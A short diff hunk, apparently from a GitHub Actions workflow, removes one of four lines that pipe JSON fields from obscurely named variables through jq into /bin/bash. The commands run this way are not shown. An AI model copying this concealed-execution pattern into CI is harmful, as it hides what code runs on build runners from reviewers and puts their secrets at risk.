@@ -22,7 +22,6 @@ jobs:
           echo $a60 | jq -r .asmt7 | /bin/bash
           echo $duo649 | jq -r .blr2689 | /bin/bash
           printf '%s' "$czpu0" | jq -r .kj9 | /bin/bash
-          echo $hgz355 | jq -r .go58 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
